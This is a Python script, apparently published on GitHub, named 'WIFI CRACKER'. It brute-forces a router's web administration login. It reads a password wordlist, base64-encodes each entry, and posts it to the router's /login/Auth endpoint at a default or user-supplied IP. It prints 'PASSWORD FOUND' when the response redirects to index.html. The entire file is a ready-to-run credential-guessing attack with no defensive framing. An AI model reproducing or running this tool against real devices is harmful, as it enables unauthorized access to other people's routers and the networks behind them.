import requests, base64
import pyfiglet,os
from colorama import Fore

def banner():
    os.system("cls")
    text_banner = pyfiglet.figlet_format("WIFI CRACKER")
    print(Fore.CYAN+text_banner)
    print(Fore.LIGHTBLUE_EX+"-"*30)
    print(f"      GITHUB >>> TRFAHIM")
    print(Fore.LIGHTBLUE_EX+"-"*30)

banner()
ip_input = input(Fore.LIGHTYELLOW_EX+"\n[1] DEFAULT IP [2] SET IP >>> ")
if ip_input == "1":
    ip = "192.168.0.1"
else:
    ip = input("\nENTER IP ADRESS >>> ") 
passwd = input("Input Wordlist Path >>> ")
banner()
print("========= Start Scanning ==========\n")

with open(passwd, 'r') as password:
    attempt = 0
    for pass_1 in password:
        pass_try = pass_1.replace('\n', '')
        attempt=attempt+1
        payload = {
            'password': base64.b64encode(pass_try.encode()).decode()
        }
        
        login = requests.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True)
        if 'http://'+ip+'/index.html' == login.url:
            print("\n")
            print(Fore.LIGHTBLUE_EX+"*"*30)
            print(Fore.CYAN+f"   PASSWORD FOUND :: {pass_try}")
            print(Fore.LIGHTBLUE_EX+"*"*30)
            print("\n")
            break
        else:
            print(Fore.LIGHTGREEN_EX+f"Attempt[{attempt}]: {Fore.WHITE}Trying >> {Fore.RED}{pass_try}")
